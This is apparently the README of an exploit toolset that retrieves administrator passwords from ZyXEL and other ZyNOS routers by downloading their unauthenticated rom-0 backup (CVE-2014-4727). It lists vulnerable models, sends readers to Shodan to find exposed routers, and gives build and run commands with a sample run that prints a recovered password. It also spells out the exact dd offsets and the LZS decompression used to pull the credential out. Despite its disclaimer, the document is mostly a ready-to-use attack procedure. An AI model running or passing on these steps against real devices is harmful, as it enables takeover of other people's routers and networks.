# ZyNOS ROM-0 Password Retriever

Extracts the administrator password from ZyXEL routers that expose their `rom-0` configuration file without authentication. The `rom-0` file is LZS-compressed; this toolset downloads it, decompresses it, and prints the embedded credentials.

> **For authorised security testing and research only.**  
> Running this against devices you do not own or have explicit written permission to test is illegal.

---

## Vulnerability

Affected ZyXEL routers running ZyNOS serve the full configuration backup at:

```
http://<router-ip>/rom-0
```

with no authentication required. The file contains the admin password inside an LZS-compressed block (`autoexec.net`). This was publicly disclosed around 2014 and affects a wide range of ADSL routers that shipped with ZyNOS firmware.

**CVE:** CVE-2014-4727  
**Vendor:** [zyxel.com](http://www.zyxel.com/)  
**Version:** x.x.x  
**Risk:** High — unauthenticated credential disclosure  
**Tested on:** Windows 7 Edition Intégrale 64-bit, Kali Linux

### Known vulnerable devices

| Vendor   | Model                  |
|----------|------------------------|
| ZyXEL    | P-660HW T1 v2          |
| Huawei   | EchoLife HG520s        |
| Billion  | 5200                   |
| TP-Link  | W8901G                 |
| ZyXEL    | P-660HW-D1             |
| ZyXEL    | P-660R-D1              |

### Finding targets

Routers running RomPager (the embedded web server used by ZyNOS) can be discovered via Shodan:

🔍 [Search Shodan for RomPager](http://www.shodanhq.com/search?q=RomPager)

---

## Video Tutorial

A walkthrough of the attack is available on YouTube:

▶ [https://www.youtube.com/watch?v=2R8Zp4vjUKU](https://www.youtube.com/watch?v=2R8Zp4vjUKU)

---

## Repository layout

```
.
├── lzs_decompress.c      # Standalone LZS bit-stream decompressor
├── rom0decoder.c         # Full ROM-0 parser — walks the block table and
│                         #   prints the password for every autoexec.net block
├── zyxel_rom0_extract.sh # Orchestration script: downloads rom-0, extracts
│                         #   the credential block, and calls both binaries
└── README.md
```

---

## Requirements

- GCC (or any C99-compatible compiler)
- `curl`
- `dd`
- `strings` (part of GNU binutils)
- Linux / macOS (the shell script requires Bash 4+)

---

## Building

The shell script compiles both C files automatically on first run. To build manually:

```bash
gcc -O2 -Wall -o exp           lzs_decompress.c
gcc -O2 -Wall -o RomDecoder    rom0decoder.c
```

---

## Usage

### Automated (recommended)

```bash
chmod +x zyxel_rom0_extract.sh
./zyxel_rom0_extract.sh <router-ip> [port]
```

`port` defaults to `80` if omitted.

Example:

```
$ ./zyxel_rom0_extract.sh 192.168.1.1

[*] Compiling lzs_decompress.c ...
[*] Compiling rom0decoder.c ...
[*] Downloading rom-0 from http://192.168.1.1:80/rom-0 ...
[*] Downloaded 47352 bytes.
[*] Extracting spt.dat block ...
[*] Extracting compressed credential data ...
[*] Decompressing and extracting password ...
[+] Password: s3cr3tpassword
[*] Running full ROM decoder ...
[00] offset=0x0000  size=0x1234  name=autoexec.net
LZS: end-of-stream marker found.
>>> Password: s3cr3tpassword

Wrote 2048 decompressed bytes to "/tmp/zyxel_rom0.XXXXX/rom-0.dat"
[+] Done.
```

![](https://pbs.twimg.com/media/Cy8-qS8WQAAGHUR.jpg)

### Manual

If you already have a `rom-0` file on disk:

```bash
# Full block-table decode + password print
./RomDecoder /path/to/rom-0

# Decompress only a raw LZS payload and write to stdout
./exp /path/to/data.lzs
```

---

## How it works

1. **Download** — `curl` fetches `http://<ip>/rom-0` and checks the HTTP response code.
2. **Slice** — `dd` skips to offset `8552` and extracts 39 600 bytes (`spt.dat`), then skips a 16-byte header inside that to get the raw 220-byte LZS payload.
3. **Decompress** — `lzs_decompress` / `exp` implements the LZS sliding-window algorithm:  
   - A `0` bit → literal byte follows (8 bits).  
   - A `1` bit → back-reference: a second bit selects a 7-bit (short) or 11-bit (long) offset, then a variable-length field encodes the copy length.  
   - End-of-stream is signalled by the bit pattern `11` followed by seven zero bits.
4. **Extract** — The password sits at a fixed offset (`0x14`) inside the decompressed block.
5. **Full decode** — `rom0decoder` additionally walks the entire ROM-0 block table, printing every named section and decompressing the `autoexec.net` entry to a `.dat` file.

---

## Credits

- Original LZS decompressor concept: [kopf-tisch.de](http://git.kopf-tisch.de/?p=zyxel-revert;a=summary) and [OmerMor/SciStudio](https://github.com/OmerMor/SciStudio)
- Original tooling: alguien, **KinG Of PiraTeS**
- Rewrite: improved safety, structure, and error handling based on the originals above

### Author — KinG Of PiraTeS (0x337)

| | |
|---|---|
| Twitter | [@0x337](https://twitter.com/0x337) |
| E-mail | t5r@hotmail.fr / cr4ck3d@offdr5cax.dz |
| Web | [1337day.com](http://www.1337day.com) · [inj3ct0rs.com](http://www.inj3ct0rs.com) |

### Greetings

Peace from **Algeria** 🇩🇿

Props to all Algerian hackers and the security community:
KedAns-Dz, kalashinkov3, Kondamne, errajol ettayeb, Oussama Dz,
Hanixpo, Indoushka, Jago-dz, BriscO-Dz, Over-X, Kha&miX,
Ev!LsCr!pT_Dz, T0xic, TrOon, Tn_Scorpion — and everyone else you know who you are.

Communities: [exploit-id.com](http://exploit-id.com) · [1337day.com](http://1337day.com) · [Sec4ever.com](http://Sec4ever.com) · [h4ckforu.com](http://h4ckforu.com) · [alboraaq.com](http://alboraaq.com)

---

## Disclaimer

This tool is provided for **educational and authorised penetration testing purposes only**. The authors accept no responsibility for misuse. Always obtain written permission before testing any device or network you do not own.
